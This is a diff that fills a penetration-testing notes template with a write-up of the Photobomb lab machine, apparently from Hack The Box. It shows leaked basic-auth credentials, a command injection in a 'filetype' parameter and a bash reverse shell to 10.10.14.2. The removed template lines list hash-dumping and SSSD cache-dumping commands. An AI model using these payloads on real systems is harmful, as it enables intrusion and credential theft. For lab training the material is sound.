@@ -2,58 +2,126 @@ Tags:
 # **Nmap Results**
 
 ```text
-Nmap output here
+Nmap scan report for 10.10.11.182
+Host is up (0.088s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
+|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
+|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
 ```
 <br>
 <br>
 
 # **Service Enumeration**
-Document here:
-* Screenshots (web browser, terminal screen)
-* Service version numbers
-* Document your findings when interacting with the service at various stages
+The Nmap results tell us that there are 2 ports open, port 22 for **SSH** and port 80 for an **nginx** webserver. The default script scan discovers the hostname of the box, photobomb.htb, so we add this to our /etc/hosts file.  
 
+Here's what we see when we access the page in our browser:
+![[Pasted image 20241223204118.png]]
+The link on the line telling you how to get started leads to a page `/printer`, which has **HTTP authentication** set up. We don't have any creds so we continue enumerating
 
+Here's the page source:
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Photobomb</title>
+  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
+  <script src="photobomb.js"></script>
+</head>
+<body>
+  <div id="container">
+    <header>
+      <h1><a href="/">Photobomb</a></h1>
+    </header>
+    <article>
+      <h2>Welcome to your new Photobomb franchise!</h2>
+      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
+      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
+      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
+      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
+    </article>
+  </div>
+</body>
+</html>
+```
+
+We see 1 line of interest here, `<script src="photobomb.js"></script>`. Here's what we find in the source of that file:
+
+```javascript
+function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
+  }
+}
+window.onload = init;
+```
+This script was created because of tech supports inability to remember their creds to the `/printer` page. It first checks if the cookie `isPhotoBombTechSupport` exists and contains some value, and if so, it retrieves all elements by the class `creds` and modifies the first instance (the url) to include the username and password for HTTP authentication. 
+
+Given this, we can now access the `/printer` page. Here's what we find:
+![[Pasted image 20241223210527.png]]
+We are given the option to print various photos. The page source doesn't show anything of interest, so we'll intercept and analyze the request made when clicking the download button with **burpsuite**. 
+
+Here is the request we're sending:
+```
+POST /printer HTTP/1.1
+Host: photobomb.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
+Origin: http://photobomb.htb
+Authorization: Basic cEgwdDA6YjBNYiE=
+Connection: keep-alive
+Referer: http://photobomb.htb/printer
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
+```
+We see 3 parameters, **photo, filetype, and dimensions**. My first instinct was to test for an **LFI** vulnerability in the photo parameter by typing a bunch of **"../"** characters and then **/etc/passwd**, but the response was **"Invalid photo"**. 
+
+I then tested to see how the web server responded to unexpected input like invalid filetypes or special characters that don't belong. The latter caused the web server to respond differently when I inputted a semicolon in the filetype parameter. It returned:
+
+`Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg`
+
+This led me to believe that the **filetype** parameter had an **RCE** vulnerability. I tested it by passing `jpg; sleep 5`. The server did end up taking 5 seconds to respond, meaning we do have RCE on the machine.
 <br>
 <br>
-
 # **Exploitation**
 ## **Initial Access**
-Document here:
-* Exploit used (link to exploit)
-* Explain how the exploit works against the service
-* Any modified code (and why you modified it)
-* Proof of exploit (screenshot of reverse shell with target IP address output)
-
+Given the RCE vuln, I set up a listener with `nc -lvnp 9001` on my machine and passed a common reverse shell one liner in the filetype parameter like so: `jpg; bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'`. To be safe, I url encoded this and then sent the request. 
+![[Pasted image 20241223233534.png]]
+The listener caught the request made to my machine and I got a shell. We are logged in as **wizard**. 
 <br>
 <br>
 
 ## **Post-Exploit Enumeration**
 ### **Operating Environment**
 
-> [!tldr]- OS &amp; Kernel
->Document here:
->- Windows
->    - `systeminfo` or `Get-ComputerInfo` output
->    - Check environment variables:
- >       - CMD: `set`
- >       - PowerShell: `Get-ChildItem Env:\`
->
->- *nix
->    - `uname -a` output
->    - `cat /etc/os-release` (or similar) output
->    - Check environment variables:
->       - `env` or `set`
-
 > [!tldr]- Current User
-> Document here:
-> - Windows
->     - `whoami /all` output
->   
-> - *nix
->     - `id` output
->     - `sudo -l` output
-
+> - `id` output:
+> `uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)`
+> - `sudo -l` output:
+>	```
+>	User wizard may run the following commands on photobomb:
+  > 	 (root) SETENV: NOPASSWD: /opt/cleanup.sh
+>	```
+> 
 <br>
 
 ### **Users and Groups**
@@ -78,101 +146,6 @@ Document here:
 >     - `cat /etc/group` output
 >     - `cat /etc/group | grep <username>` to check group memberships of specific users
 
-> [!tldr]- Domain Users (Standalone Domain Controller or Network)
-> Document here any interesting username(s) after running the below commands:
-> - Windows
->     - `net user /domain` or `Get-ADUser -Filter * -Properties *` output
->     - `net user <username> /domain` or `Get-ADUser -Identity <username> -Properties *` to enumerate details about specific domain users
->     - Not a local administrator and can't run PowerShell AD cmdlets?
->       - See here: https://notes.benheater.com/books/active-directory/page/powershell-ad-module-on-any-domain-host-as-any-user
->     - Can you dump and pass/crack local user / admin hashes from the SAM using your current access?
->     - Can you dump and pass/crack hashes from LSA using your current access?
-> 
-> - *nix
->     - Check if joined to a domain
->       - /usr/sbin/realm list -a
->       - /usr/sbin/adcli info <realm_domain_name>
-> 
->     - No credential:
-> 
->       - Check for log entries containing possible usernames
-> 
->         - `find /var/log -type f -readable -exec grep -ail '<realm_domain_name>' {} \; 2>/dev/null`
->         - Then, grep through each log file and remove any garbage from potential binary files:
-> 
->           - Using strings: `strings /var/log/filename | grep -i '<realm_domain_name>'`
->           - If strings not available, try using od: `od -An -S 1 /var/log/filename | grep -i '<realm_domain_name>'`
->           - If od not available, try grep standalone: `grep -iao '.*<realm_domain_name>.*' /var/log/filename`
-> 
->         - Validate findings:
->           - Check if discovered usernames are valid: `getent passwd <domain_username>`
->           - If valid, check user group memberships: List `id <domain_username>`
->         - Check domain password and lockout policy for password spray feasibility
-> 
->       - See `Domain Groups`, as certain commands there can reveal some additional usernames
-> 
->      - With a domain credential:
-> 
->        - If you have a valid domain user credential, you can try `ldapsearch`
->        - Dump all objects from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=*'`
->        - Dump all users from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=account'`
-> 
-> 
->     - If you're root on the domain-joined host:
-> 
->        - You can try best-effort dumping the SSSD cache:
-> 
->          - Using strings: `strings /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -iE '[ou|cn]=.*user.*'` | grep -iv 'disabled' | sort -u
->          - If strings not available, try using od: `od -An -S 1 /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -iE '[ou|cn]=.*user.*'` | grep -iv 'disabled' | sort -u
->          - If od not available, try grep standalone: `grep -iao '.*<realm_domain_name>.*' /var/lib/sss/db/cache_<realm_domain_name>.ldb | sed 's/[^[:print:]\r\t]/\n/g' | grep -iE '[ou|cn]=.*user.*' | grep -iv disabled`
-> 
->        - You can transfer the SSSD TDB cache for local parsing
-> 
->          - Default file path: /var/lib/sss/db/cache_<realm_domain_name>.tdb
->          - You can dump this file with tools such as `tdbtool` or `tdbdump`
-
-> [!tldr]- Domain Groups (Standalone Domain Controller or Network)
-> Document here any interesting group(s) after running the below commands:
-> - Windows
->     - `net group /domain` or `Get-ADGroup -Filter * -Properties *` output
->     - `net group <group_name> /domain` or `Get-ADGroup -Identity <group_name> | Get-ADGroupMember -Recursive` to enumerate members of specific domain groups
->     - Not a local administrator and can't run PowerShell AD cmdlets?
->       - See here: https://notes.benheater.com/books/active-directory/page/powershell-ad-module-on-any-domain-host-as-any-user
-> 
-> - *nix
-> 
->     - Check if joined to a domain
->       - /usr/sbin/realm list -a
->       - /usr/sbin/adcli info <realm_domain_name>
-> 
->     - No credential:
-> 
->       - Enumerate default Active Directory security groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#default-active-directory-security-groups
-> 
->         - `getent group 'Domain Admins@<realm_domain_name>'`
->         - `getent group 'Domain Users@<realm_domain_name>'`
->         - NOTE: `getent` will only return domain group members that have been cached on the local system, not all group members in the domain
->         - This can still build a substantial user list for password spraying (check domain password and lockout policy)
-> 
->     - With a domain credential:
-> 
->        - If you have a valid domain user credential, you can try `ldapsearch`
->        - Dump all objects from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=*'`
->        - Dump all groups from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=group'`
-> 
->     - If you're root on the domain-joined host:
-> 
->        - You can try dumping the SSSD cache:
-> 
->          - Using strings: `strings /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -i '<realm_domain_name>'`
->          - If strings not available, try using od: `od -An -S 1 /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -i '<realm_domain_name>'`
->          - If od not available, try grep standalone: `grep -iao '.*<realm_domain_name>.*' /var/lib/sss/db/cache_<realm_domain_name>.ldb | sed 's/[^[:print:]\r\t]/\n/g' | grep -iE '[ou|cn]=.*group.*' | grep -i '^CN='`
-> 
->        - You can transfer the SSSD TDB cache for local parsing
-> 
->          - Default file path: /var/lib/sss/db/cache_<realm_domain_name>.tdb
->          - You can dump this file with tools such as `tdbtool` or `tdbdump`
-
 <br>
 
 ### **Network Configurations**
@@ -194,36 +167,6 @@ Document here:
 >   
 > - *nix
 >     - `netstat -tanup | grep -i listen` or `ss -tanup | grep -i listen` output
-
-> [!tldr]- ARP Table
->
-> If targeting a network and enumerating additional hosts...
-> Document here:
->
-> - Windows
->     - `arp -a` or `Get-NetNeighbor` output
-> - *nix
->     - `ip neigh` or `arp -a` output
-
-> [!tldr]- Routes
->
-> If targeting a network and enumerating additional hosts...
-> Document here:
->
-> - Windows
->     - `route print` or `Get-NetRoute` output
-> - *nix
->     - `ip route` or `route` output
-
-> [!tldr]- Ping Sweep
->
-> If the host has access to additional routes / interfaces:
->
->- Look at the IP address space and network mask
->- Find a ping sweep script that will work for the target network
->- Or you could try:
->	- Transfering `nmap` or some other host discover tool to the host
->	- Set up a SOCKS proxy and try a port scan through the foothold
 
 <br>
 
@@ -375,11 +318,6 @@ Document here:
 >         - Check for readable and/or writable configuration files
 >         - May find cleartext passwords
 
-> [!tldr]- /opt/interesting_dir/interesting-file2.txt
->
-> Add full file contents
-> Or snippet of file contents
-
 <br>
 <br>
 
@@ -394,15 +332,11 @@ Document here:
 <br>
 <br>
 
-# **Persistence**
-
-Document here how you set up persistence on the target
-
 
 
 # Skills Learned
 
-Document here what you've learned after completing the box
+- Given testable web parameters, don't immediately assume LFI. **Fuzz them using tools like wfuzz or ffuf and see if the web server behaves differently or returns something unexpected**
 <br>
 <br>
 
@@ -410,7 +344,7 @@ Document here what you've learned after completing the box
 
 > [!tldr]- User
 > 
-> `flag goes here`
+> `81baa911e24520eb4af2cae91daaa46a`
 
 > [!tldr]- Root
 > 
